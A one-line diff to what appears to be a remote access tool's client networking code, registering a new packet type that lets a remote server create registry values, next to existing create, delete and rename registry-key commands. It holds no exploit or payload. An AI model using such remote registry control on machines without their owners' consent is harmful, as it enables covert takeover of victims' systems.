@@ -61,6 +61,7 @@ namespace xClient.Core.Networking
                 typeof (Packets.ServerPackets.DoCreateRegistryKey),
                 typeof (Packets.ServerPackets.DoDeleteRegistryKey),
                 typeof (Packets.ServerPackets.DoRenameRegistryKey),
+                typeof (Packets.ServerPackets.DoCreateRegistryValue),
                 typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
